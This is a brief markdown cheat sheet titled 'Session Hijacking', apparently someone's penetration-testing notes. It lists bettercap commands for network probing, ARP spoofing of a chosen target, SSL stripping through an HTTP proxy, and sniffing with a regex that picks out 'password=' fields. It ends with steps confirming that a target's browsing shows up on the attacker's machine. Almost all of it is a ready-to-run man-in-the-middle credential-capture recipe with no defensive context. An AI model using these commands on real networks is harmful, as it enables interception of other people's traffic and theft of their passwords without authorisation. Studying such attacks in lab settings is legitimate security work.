# Session Hijacking

## bettercap

```
bettercap -h
bettercap -iface eth0
net.probe on
net.recon on
set http.proxy.sslstrip true
set arp.spoof.internal true
set arp.spoof.targets	target
http.proxy on
arp.spoof on
net.sniff on
set net.sniff.regexp'.*password=.+'
```
Go to target machine
visit any website
Enteries will be seen on attacker's machine
	
